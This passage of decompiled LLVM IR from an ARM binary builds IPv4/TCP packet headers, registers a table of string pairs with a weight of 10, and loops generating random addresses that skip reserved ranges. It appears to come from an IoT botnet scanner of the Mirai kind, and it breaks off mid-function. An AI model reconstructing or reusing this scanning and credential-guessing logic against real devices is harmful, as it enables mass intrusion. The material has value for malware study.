  store i32 3, i32* %r2.global-to-local, align 4
  %v2_10490 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10490, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v6_104a0 = call i32 @function_13760(i32 %v2_10480, i32 %v0_10484, i32 3, i32* nonnull %stack_var_-52, i32 4)
  store i32 %v6_104a0, i32* %r0.global-to-local, align 4
  %v2_104a4 = icmp eq i32 %v6_104a0, 0
  store i1 %v2_104a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_104a4, label %dec_label_pc_104ac, label %dec_label_pc_10c8c

dec_label_pc_104ac:                               ; preds = %dec_label_pc_1045c, %dec_label_pc_104ac
  %v0_104ac = call i32 @function_fe24()
  %v3_104b0 = mul i32 %v0_104ac, 65536
  store i32 %v3_104b0, i32* %r0.global-to-local, align 4
  %v3_104b4 = urem i32 %v0_104ac, 65536
  store i32 %v3_104b4, i32* %r1.global-to-local, align 4
  %v1_104b8 = mul i32 %v0_104ac, 256
  %v3_104bc = and i32 %v1_104b8, 65280
  %tmp253 = udiv i32 %v0_104ac, 256
  %v4_104c0 = urem i32 %tmp253, 256
  %v5_104c0 = or i32 %v4_104c0, %v3_104bc
  store i32 %v5_104c0, i32* %r3.global-to-local, align 4
  %v7_104c4 = icmp eq i32 %v5_104c0, 1024
  store i1 %v7_104c4, i1* %cpsr_z.global-to-local, align 1
  %v3_104cc = icmp ult i32 %v5_104c0, 1022
  br i1 %v3_104cc, label %dec_label_pc_104ac, label %dec_label_pc_104d0

dec_label_pc_104d0:                               ; preds = %dec_label_pc_104ac
  %v5_104c8.le = trunc i32 %v0_104ac to i8
  store i32 ptrtoint (i8** @global_var_1e3f4.202 to i32), i32* %ip.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_1e3f4.202 to i8*), align 4
  store i32 0, i32* @r5, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i8 40, i8* bitcast (i32* @global_var_1e3f7.203 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1e3f6.204 to i8*), align 4
  %v0_1050c = call i32 @function_fe24()
  %v1_1050c = trunc i32 %v0_1050c to i8
  store i32 %v0_1050c, i32* %r0.global-to-local, align 4
  %v3_10514 = load i8, i8* @global_var_1e414.207, align 1
  store i32 ptrtoint (i8** @global_var_1e3f4.202 to i32), i32* %lr.global-to-local, align 4
  %v4_1051c209 = udiv i32 %v0_1050c, 256
  %v1_10520 = trunc i32 %v4_1051c209 to i8
  store i8 %v1_10520, i8* bitcast (i32* @global_var_1e3f9.208 to i8*), align 4
  %v4_10524 = sext i8 %v5_104c8.le to i32
  store i8 6, i8* bitcast (i32* @global_var_1e3fd.209 to i8*), align 4
  %tmp = urem i8 %v3_10514, 16
  %v1_10530 = zext i8 %tmp to i32
  store i32 ptrtoint (i32* @global_var_1e408.206 to i32), i32* %r2.global-to-local, align 4
  %v3_10538 = sdiv i32 %v4_10524, 256
  store i32 %v3_10538, i32* %ip.global-to-local, align 4
  %v1_1053c = or i32 %v1_10530, 80
  store i32 %v1_1053c, i32* %r1.global-to-local, align 4
  store i8 64, i8* bitcast (i32* @global_var_1e3fc.210 to i8*), align 4
  %v1_10548 = trunc i32 %v1_1053c to i8
  store i8 %v1_10548, i8* @global_var_1e414.207, align 1
  store i8 23, i8* bitcast (i32* @global_var_1e40b.211 to i8*), align 4
  store i32 %v4_10524, i32* %r3.global-to-local, align 4
  %v1_10558 = trunc i32 %v3_10538 to i8
  store i8 %v1_10558, i8* bitcast (i32* @global_var_1e409.212 to i8*), align 4
  store i8 %v1_1050c, i8* bitcast (i32* @global_var_1e3f8.213 to i8*), align 4
  store i8 %v5_104c8.le, i8* bitcast (i32* @global_var_1e408.206 to i8*), align 4
  %v0_10564 = load i32, i32* @r5, align 4
  %v1_10564 = trunc i32 %v0_10564 to i8
  store i8 %v1_10564, i8* bitcast (i32* @global_var_1e40a.214 to i8*), align 4
  %v0_10568 = call i32 @function_fe24()
  %v3_10570 = load i8, i8* @global_var_1e415.215, align 1
  %v4_10570 = zext i8 %v3_10570 to i32
  store i32 ptrtoint (i32* @global_var_1e408.206 to i32), i32* @lr, align 4
  %sext6 = mul i32 %v0_10568, 16777216
  %v1_10578 = sdiv i32 %sext6, 16777216
  store i32 %v1_10578, i32* @r4, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  %v3_10580 = ashr i32 %sext6, 31
  store i32 %v3_10580, i32* %ip.global-to-local, align 4
  %v1_10584 = or i32 %v4_10570, 2
  store i32 %v1_10584, i32* %r3.global-to-local, align 4
  %v1_10588 = trunc i32 %v3_10580 to i8
  store i8 %v1_10588, i8* bitcast (i32* @global_var_1e417.218 to i8*), align 4
  %v1_1058c = trunc i32 %v1_10584 to i8
  store i8 %v1_1058c, i8* @global_var_1e415.215, align 1
  %v1_10590 = trunc i32 %v1_10578 to i8
  store i8 %v1_10590, i8* bitcast (i32* @global_var_1e416.219 to i8*), align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_1059c = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32* %r1.global-to-local, align 4
  %v5_105ac = call i32 @function_101cc(i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_15918.223 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_105bc = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint ([6 x i8]* @global_var_15918.223 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15920.225 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_105cc = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint (i32* @global_var_15920.225 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15928.227 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_105dc = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint (i32* @global_var_15928.227 to i32), i32 10)
  store i32 ptrtoint ([8 x i8]* @global_var_15930.229 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_15938.231 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_105ec = call i32 @function_101cc(i32 ptrtoint ([8 x i8]* @global_var_15930.229 to i32), i32 ptrtoint ([7 x i8]* @global_var_15938.231 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_15940.233 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_105fc = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint ([8 x i8]* @global_var_15940.233 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15878.235 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1060c = call i32 @function_101cc(i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32 ptrtoint (i32* @global_var_15878.235 to i32), i32 10)
  store i32 ptrtoint ([8 x i8]* @global_var_15948.237 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_15948.237 to i32), i32* %r1.global-to-local, align 4
  %v5_1061c = call i32 @function_101cc(i32 ptrtoint ([8 x i8]* @global_var_15948.237 to i32), i32 ptrtoint ([8 x i8]* @global_var_15948.237 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15950.239 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1062c = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint (i32* @global_var_15950.239 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15958.241 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1063c = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint (i32* @global_var_15958.241 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_15964.243 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_1064c = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint ([9 x i8]* @global_var_15964.243 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_15964.243 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_1065c = call i32 @function_101cc(i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32 ptrtoint ([9 x i8]* @global_var_15964.243 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15970.245 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1066c = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint (i32* @global_var_15970.245 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_15978.247 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_1067c = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint ([9 x i8]* @global_var_15978.247 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_1068c = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15950.239 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1069c = call i32 @function_101cc(i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32 ptrtoint (i32* @global_var_15950.239 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15984.249 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_106ac = call i32 @function_101cc(i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32 ptrtoint (i32* @global_var_15984.249 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_158d0.251 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_106bc = call i32 @function_101cc(i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32 ptrtoint (i32* @global_var_158d0.251 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1598c.253 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_106cc = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint (i32* @global_var_1598c.253 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15994.255 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15994.255 to i32), i32* %r1.global-to-local, align 4
  %v5_106dc = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15994.255 to i32), i32 ptrtoint ([5 x i8]* @global_var_15994.255 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_1599c.257 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1599c.257 to i32), i32* %r1.global-to-local, align 4
  %v5_106ec = call i32 @function_101cc(i32 ptrtoint ([6 x i8]* @global_var_1599c.257 to i32), i32 ptrtoint ([6 x i8]* @global_var_1599c.257 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_159a4.259 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_106fc = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint ([6 x i8]* @global_var_159a4.259 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_159ac.261 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1070c = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint (i32* @global_var_159ac.261 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_159b8.263 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1071c = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint (i32* @global_var_159b8.263 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_159bc.265 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1072c = call i32 @function_101cc(i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32 ptrtoint (i32* @global_var_159bc.265 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_158a8.267 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1073c = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint (i32* @global_var_158a8.267 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1583c.269 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1074c = call i32 @function_101cc(i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32 ptrtoint (i32* @global_var_1583c.269 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_15850.271 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_1075c = call i32 @function_101cc(i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32 ptrtoint ([11 x i8]* @global_var_15850.271 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15984.249 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1076c = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint (i32* @global_var_15984.249 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1585c.273 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1077c = call i32 @function_101cc(i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32 ptrtoint (i32* @global_var_1585c.273 to i32), i32 10)
  store i32 ptrtoint ([11 x i8]* @global_var_15868.275 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15874.277 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1078c = call i32 @function_101cc(i32 ptrtoint ([11 x i8]* @global_var_15868.275 to i32), i32 ptrtoint (i32* @global_var_15874.277 to i32), i32 10)
  store i32 ptrtoint ([8 x i8]* @global_var_15948.237 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_1079c = call i32 @function_101cc(i32 ptrtoint ([8 x i8]* @global_var_15948.237 to i32), i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15880.279 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_107ac = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint (i32* @global_var_15880.279 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1588c.281 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_107bc = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint (i32* @global_var_1588c.281 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_158a8.267 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_107cc = call i32 @function_101cc(i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32 ptrtoint (i32* @global_var_158a8.267 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15898.283 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_107dc = call i32 @function_101cc(i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32 ptrtoint ([5 x i8]* @global_var_15898.283 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_158a0.285 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_107ec = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint (i32* @global_var_158a0.285 to i32), i32 10)
  store i32 ptrtoint (i32* @global_var_158ac.287 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_158b4.289 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_107fc = call i32 @function_101cc(i32 ptrtoint (i32* @global_var_158ac.287 to i32), i32 ptrtoint ([7 x i8]* @global_var_158b4.289 to i32), i32 10)
  store i32 ptrtoint ([7 x i8]* @global_var_158bc.291 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_158bc.291 to i32), i32* %r1.global-to-local, align 4
  %v5_1080c = call i32 @function_101cc(i32 ptrtoint ([7 x i8]* @global_var_158bc.291 to i32), i32 ptrtoint ([7 x i8]* @global_var_158bc.291 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_158c4.293 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1081c = call i32 @function_101cc(i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32 ptrtoint (i32* @global_var_158c4.293 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_158cc.295 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1082c = call i32 @function_101cc(i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), i32 ptrtoint (i32* @global_var_158cc.295 to i32), i32 10)
  store i32 ptrtoint ([9 x i8]* @global_var_158d8.297 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_158d8.297 to i32), i32* %r1.global-to-local, align 4
  %v5_1083c = call i32 @function_101cc(i32 ptrtoint ([9 x i8]* @global_var_158d8.297 to i32), i32 ptrtoint ([9 x i8]* @global_var_158d8.297 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_158e4.299 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1084c = call i32 @function_101cc(i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), i32 ptrtoint (i32* @global_var_158e4.299 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_1599c.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15950.239 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1085c = call i32 @function_101cc(i32 ptrtoint ([6 x i8]* @global_var_1599c.257 to i32), i32 ptrtoint (i32* @global_var_15950.239 to i32), i32 10)
  %v2_10864 = ptrtoint i32* %stack_var_-1862 to i32
  store i32 %v2_10864, i32* %r0.global-to-local, align 4
  %v2_10868 = ptrtoint i32* %stack_var_-1842 to i32
  store i32 %v2_10868, i32* %r1.global-to-local, align 4
  %tmp254 = bitcast i32* %stack_var_-1842 to i8*
  br label %dec_label_pc_10874

dec_label_pc_10874:                               ; preds = %dec_label_pc_10e90, %dec_label_pc_104d0
  %v0_10c04 = phi i32 [ %v2_10864, %dec_label_pc_104d0 ], [ %stack_var_-1872.1, %dec_label_pc_10e90 ]
  %stack_var_-1868.0 = phi i8 [ %v5_104c8.le, %dec_label_pc_104d0 ], [ %stack_var_-1868.1, %dec_label_pc_10e90 ]
  %stack_var_-1876.0 = phi i8* [ %tmp254, %dec_label_pc_104d0 ], [ %stack_var_-1876.1, %dec_label_pc_10e90 ]
  store i32 ptrtoint (i32* @global_var_1e424.184 to i32), i32* %r2.global-to-local, align 4
  %v2_10878 = load i32, i32* @global_var_1e424.184, align 4
  store i32 %v2_10878, i32* %sl.global-to-local, align 4
  %v0_1087c = load i32, i32* @fp, align 4
  %v9_1087c = icmp eq i32 %v0_1087c, %v2_10878
  store i1 %v9_1087c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1087c, label %dec_label_pc_10af8, label %dec_label_pc_10884

dec_label_pc_10884:                               ; preds = %dec_label_pc_10874
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v2_10ad0 = ptrtoint i32* %stack_var_-92 to i32
  br label %dec_label_pc_1088c

dec_label_pc_1088c:                               ; preds = %dec_label_pc_109e8, %dec_label_pc_10884
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v0_108a0 = call i32 @function_fe24()
  %v1_108a0 = trunc i32 %v0_108a0 to i8
  store i32 %v0_108a0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e46c.86 to i32), i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1e3f4.202 to i32), i32* %r1.global-to-local, align 4
  %v2_108ac = load i32, i32* @global_var_1e46c.86, align 4
  store i32 %v2_108ac, i32* %r2.global-to-local, align 4
  %v4_108b0 = sdiv i32 %v0_108a0, 256
  store i32 %v4_108b0, i32* %r3.global-to-local, align 4
  %v1_108b4 = trunc i32 %v4_108b0 to i8
  store i8 %v1_108b4, i8* bitcast (i32* @global_var_1e3f9.208 to i8*), align 4
  store i32 %v2_108ac, i32* @global_var_1e400.300, align 4
  store i8 %v1_108a0, i8* bitcast (i32* @global_var_1e3f8.213 to i8*), align 4
  br label %dec_label_pc_108c0

dec_label_pc_108c0:                               ; preds = %dec_label_pc_10994, %dec_label_pc_108f0, %dec_label_pc_109c8, %dec_label_pc_109bc, %dec_label_pc_109b0, %dec_label_pc_109a4, %.thread32, %bb273, %bb272, %bb271, %bb270, %bb269, %dec_label_pc_1098c, %dec_label_pc_10984, %bb265, %dec_label_pc_10954, %dec_label_pc_10930, %bb258, %dec_label_pc_10900, %bb257, %dec_label_pc_108e8, %bb256, %bb275, %dec_label_pc_1088c
  %v0_108c0 = call i32 @function_fe24()
  store i32 %v0_108c0, i32* %r0.global-to-local, align 4
  %v1_108c4 = urem i32 %v0_108c0, 256
  store i32 %v1_108c4, i32* %r1.global-to-local, align 4
  %v3_108c8 = udiv i32 %v0_108c0, 256
  store i32 %v3_108c8, i32* %r3.global-to-local, align 4
  %v3_108cc = udiv i32 %v0_108c0, 65536
  store i32 %v3_108cc, i32* %r2.global-to-local, align 4
  %v2_108d0 = icmp eq i32 %v1_108c4, 0
  br i1 %v2_108d0, label %bb256, label %bb255

bb255:                                            ; preds = %dec_label_pc_108c0
  %v8_108d4 = icmp eq i32 %v1_108c4, 127
  br label %bb256

bb256:                                            ; preds = %dec_label_pc_108c0, %bb255
  %storemerge419 = phi i1 [ %v8_108d4, %bb255 ], [ %v2_108d0, %dec_label_pc_108c0 ]
  %v0_108e4 = phi i1 [ %v8_108d4, %bb255 ], [ true, %dec_label_pc_108c0 ]
  store i1 %storemerge419, i1* %cpsr_z.global-to-local, align 1
  %v1_108d8 = urem i32 %v3_108c8, 256
  store i32 %v1_108d8, i32* %ip.global-to-local, align 4
  %v1_108dc = urem i32 %v3_108cc, 256
  store i32 %v1_108dc, i32* %r2.global-to-local, align 4
  %v3_108e0 = udiv i32 %v0_108c0, 16777216
  store i32 %v3_108e0, i32* %r0.global-to-local, align 4
  br i1 %v0_108e4, label %dec_label_pc_108c0, label %dec_label_pc_108e8

dec_label_pc_108e8:                               ; preds = %bb256
  %v7_108e8 = icmp eq i32 %v1_108c4, 3
  store i1 %v7_108e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108e8, label %dec_label_pc_108c0, label %dec_label_pc_108f0

dec_label_pc_108f0:                               ; preds = %dec_label_pc_108e8
  %v1_108f0 = add nsw i32 %v1_108c4, -15
  store i32 %v1_108f0, i32* %r3.global-to-local, align 4
  %v7_108f4 = icmp eq i32 %v1_108c4, 56
  store i1 %v7_108f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108f4, label %dec_label_pc_108c0, label %bb257

bb257:                                            ; preds = %dec_label_pc_108f0
  %v8_108f8 = icmp eq i32 %v1_108f0, 1
  store i1 %v8_108f8, i1* %cpsr_z.global-to-local, align 1
  %tmp420 = or i32 %v1_108f0, 1
  %tmp421 = icmp eq i32 %tmp420, 1
  br i1 %tmp421, label %dec_label_pc_108c0, label %dec_label_pc_10900

dec_label_pc_10900:                               ; preds = %bb257
  %v7_10900 = icmp eq i32 %v1_108c4, 10
  store i1 %v7_10900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10900, label %dec_label_pc_108c0, label %dec_label_pc_10908

dec_label_pc_10908:                               ; preds = %dec_label_pc_10900
